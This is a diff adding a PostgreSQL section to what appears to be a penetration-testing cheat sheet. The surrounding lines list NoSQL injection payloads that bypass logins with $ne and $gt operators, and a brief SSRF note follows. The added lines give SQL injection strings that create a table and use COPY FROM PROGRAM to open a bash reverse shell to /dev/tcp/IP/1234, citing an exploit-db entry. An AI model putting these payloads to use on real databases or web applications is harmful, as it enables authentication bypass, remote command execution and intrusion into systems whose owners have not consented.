@@ -1001,6 +1001,13 @@ username[$ne]=toto&password[$ne]=toto
 {"username": {"$ne": null}, "password": {"$ne": null}}
 {"username": {"$gt":""}, "password": {"$gt":""}}
 
+# PSQL
+
+PostgreSQL version 9.3 vs 11.5
+https://www.exploit-db.com/exploits/46813
+'; CREATE TABLE cmd_exec(cmd_output text); --
+'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/IP/1234 0>&1'''; -- 
+
 ## SSRF
 
 web that send request to external IP's, we call 127.0.0.1:8080 / 10.1.10.111 to enum internal network
